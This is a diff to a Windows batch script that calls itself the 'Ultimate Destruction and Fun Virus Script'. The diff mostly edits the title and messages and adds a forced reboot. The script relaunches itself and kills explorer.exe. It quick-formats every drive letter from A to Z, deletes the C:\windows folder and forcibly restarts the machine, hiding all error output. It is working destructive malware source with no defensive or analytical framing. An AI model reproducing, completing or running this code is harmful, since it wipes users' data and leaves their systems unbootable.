@@ -1,5 +1,5 @@
 @echo off
-title batch virus made by prolokmn
+title Ultimate Destruction and Fun Virus Script
 
 :adminCheck
 net session >nul 2>&1
@@ -17,7 +17,7 @@ echo Ultimate destruction and fun virus activated!
 :reopen
 echo Restarting script...
 start "" "%0"
-timeout /t 3 >nul
+timeout /t 3 >nul 2>&1
 taskkill /f /im explorer.exe >nul 2>&1
 goto destroy
 
@@ -47,6 +47,11 @@ for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     echo Deleting %%d:\
     format %%d: /q /y >nul 2>&1
 )
-echo Deleting folder windows
+echo Deleting folder windows...
 @RD /S /Q "C:\windows" >nul 2>&1
-goto funVirus
+
+echo.
+echo Script will now reboot the system in 10 seconds...
+timeout /t 10 /nobreak >nul 2>&1
+echo Rebooting...
+shutdown /r /t 0 /f
